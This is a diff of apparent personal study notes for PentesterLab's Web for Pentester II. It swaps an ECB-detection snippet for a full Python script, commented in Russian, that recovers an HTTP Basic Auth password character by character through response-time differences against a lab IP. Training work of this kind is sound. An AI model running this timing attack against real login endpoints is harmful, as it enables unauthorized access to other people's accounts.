@@ -8,9 +8,60 @@ python3 -c "from pwn import xor; print(xor(bytes.fromhex('0a1709022f3e2c2619343d
 
 https://pentesterlab.com/exercises/web-for-pentester-II
 
-for line in open('8.txt'):
-    b = bytes.fromhex(line.strip())
-    chunks = [b[i:i+16] for i in range(0, len(b), 16)]
-    if len(set(chunks)) < len(chunks):
-        print(line.strip())
+import requests
+import time
+import string
+import base64
 
+# Замени IP-адрес на актуальный адрес твоего стенда PentesterLab
+url = "http://192.168.56.102/authentication/example2/"
+username = "hacker"
+
+# Алфавит для перебора - строчные буквы и цифры
+charset = string.ascii_lowercase + string.digits
+password = ""
+
+print("Начинаем подбор пароля по времени ответа...")
+
+while True:
+    max_time = 0
+    best_char = ""
+    success = False
+
+    # Перебираем каждый символ из нашего алфавита
+    for char in charset:
+        test_pass = password + char
+        credentials = f"{username}:{test_pass}"
+        
+        # Кодируем строку login:password в base64 для заголовка
+        encoded_creds = base64.b64encode(credentials.encode()).decode()
+
+        headers = {
+            "Authorization": f"Basic {encoded_creds}"
+        }
+
+        # Засекаем точное время до и после запроса
+        start_time = time.time()
+        response = requests.get(url, headers=headers)
+        elapsed_time = time.time() - start_time
+
+        print(f"Пробуем {test_pass} - время: {elapsed_time:.4f} сек")
+
+        # Если получили HTTP 200 - пароль подобран полностью
+        if response.status_code == 200:
+            password = test_pass
+            success = True
+            break
+
+        # Фиксируем символ, который заставил сервер "думать" дольше всего
+        if elapsed_time > max_time:
+            max_time = elapsed_time
+            best_char = char
+
+    if success:
+        print(f"\nУра! Пароль успешно подобран: {password}")
+        break
+
+    # Добавляем символ с максимальной задержкой к нашему паролю и идем на следующий круг
+    password += best_char
+    print(f"\n---> Найден новый символ! Текущий вариант: {password}\n")
